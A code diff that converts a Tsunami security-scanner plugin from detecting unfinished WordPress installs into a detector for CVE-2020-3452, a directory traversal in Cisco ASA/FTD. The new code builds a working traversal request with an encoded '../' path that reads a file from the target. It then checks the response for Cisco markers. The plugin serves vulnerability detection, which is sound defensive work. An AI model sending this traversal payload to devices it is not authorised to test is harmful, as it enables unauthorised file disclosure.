@@ -1,5 +1,5 @@
 /*
- * Copyright 2020 Google LLC
+ * Copyright 2020 GovTech
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -13,7 +13,7 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-package com.google.tsunami.plugins.detectors.exposedui.wordpress;
+package com.google.tsunami.plugins.detectors.cves.cve20203452;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
@@ -41,82 +41,61 @@ import java.io.IOException;
 import java.time.Clock;
 import java.time.Instant;
 import javax.inject.Inject;
-import org.jsoup.Jsoup;
-import org.jsoup.select.Elements;
 
-/** A {@link VulnDetector} that detects unfinished WordPress install. */
+/** A {@link VulnDetector} that detects CVE-2020-3452 Cisco ASA/FTD directory traversal. */
 @PluginInfo(
     type = PluginType.VULN_DETECTION,
-    name = "WordPressInstallPageDetector",
+    name = "CVE20203452",
     version = "0.1",
     description =
-        "This detector checks whether a WordPress install is unfinished. An unfinished WordPress"
-            + " installation exposes the /wp-admin/install.php page, which allows attacker to set"
-            + " the admin password and possibly compromise the system.",
-    author = "Tsunami Team (tsunami-dev@google.com)",
-    bootstrapModule = WordPressInstallPageDetectorBootstrapModule.class)
-public final class WordPressInstallPageDetector implements VulnDetector {
+        "This detector checks whether the Cisco ASA/FTD Server is vulnerable to"
+        + "CVE-2020-3452 directory traversal attack.",
+    author = "Eugene Lim (eugene_lim@tech.gov.sg)",
+    bootstrapModule = CVE20203452DetectorBootstrapModule.class)
+public final class CVE20203452Detector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
   private final Clock utcClock;
   private final HttpClient httpClient;
 
   @Inject
-  WordPressInstallPageDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
+  public CVE20203452Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
     this.utcClock = checkNotNull(utcClock);
-    this.httpClient = checkNotNull(httpClient);
+    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
   }
 
   @Override
   public DetectionReportList detect(
       TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
-    logger.atInfo().log("Starting unfinished install page detection for WordPress.");
-    DetectionReportList detectionReports =
-        DetectionReportList.newBuilder()
-            .addAllDetectionReports(
-                matchedServices.stream()
-                    // TODO(b/147455416): checking web service is not needed once we enable
-                    // service name filtering on this plugin.
-                    .filter(NetworkServiceUtils::isWebService)
-                    .filter(this::isServiceVulnerable)
-                    .map(networkService -> buildDetectionReport(targetInfo, networkService))
-                    .collect(toImmutableList()))
-            .build();
-
-    logger.atInfo().log(
-        "WordPressInstallPageDetector finished, detected '%d' vulns.",
-        detectionReports.getDetectionReportsCount());
-    return detectionReports;
+    logger.atInfo().log("Starting CVE-2020-3452 detection.");
+    return DetectionReportList.newBuilder()
+        .addAllDetectionReports(
+            matchedServices.stream()
+                .filter(NetworkServiceUtils::isWebService)
+                .filter(this::isServiceVulnerable)
+                .map(networkService -> buildDetectionReport(targetInfo, networkService))
+                .collect(toImmutableList()))
+        .build();
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
     String targetUri =
-        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
-            + "wp-admin/install.php?step=1";
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "+CSCOT+/translation-"
+            + "table?type=mst&textdomain=/%2bCSCOE%2b/../../../../..//%2bCSCOE%2b/include"
+            + "/browser_inc.lua&default-language&lang=../";
     try {
       // This is a blocking call.
       HttpResponse response = httpClient.send(get(targetUri).withEmptyHeaders().build());
       return response.status().isSuccess()
-          // TODO(b/147455416): checking WordPress string is not needed once we have plugin
-          // matching logic.
           && response
               .bodyString()
-              .map(body -> body.contains("WordPress") && responseHasSetupForm(body))
+              .map(
+                  body ->
+                      body.contains("Cisco Systems, Inc") && body.contains("browser_info.name"))
               .orElse(false);
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
       return false;
-    }
-  }
-
-  private static boolean responseHasSetupForm(String responseBody) {
-    Elements installationForm = Jsoup.parse(responseBody).select("form#setup");
-    if (installationForm.isEmpty()) {
-      logger.atInfo().log("WordPress has already been installed.");
-      return false;
-    } else {
-      logger.atInfo().log("Found unfinished WordPress installation!");
-      return true;
     }
   }
 
@@ -131,15 +110,13 @@ public final class WordPressInstallPageDetector implements VulnDetector {
             Vulnerability.newBuilder()
                 .setMainId(
                     VulnerabilityId.newBuilder()
-                        .setPublisher("GOOGLE")
-                        .setValue("UNFINISHED_WORD_PRESS_INSTALLATION"))
-                .setSeverity(Severity.CRITICAL)
-                .setTitle("Unfinished WordPress Installation")
-                // TODO(b/147455416): determine CVSS score.
-                .setDescription(
-                    "An unfinished WordPress installation exposes the /wp-admin/install.php page,"
-                        + " which allows attacker to set the admin password and possibly"
-                        + " compromise the system."))
+                        .setPublisher("GOVTECH")
+                        .setValue("CVE_2020_3452"))
+                .setSeverity(Severity.HIGH)
+                .setTitle("CVE-2020-3452")
+                .setCvssV2("5.0")
+                .setCvssV3("7.5")
+                .setDescription("Cisco ASA/FTD Server is vulnerable to CVE-2020-3452."))
         .build();
   }
 }
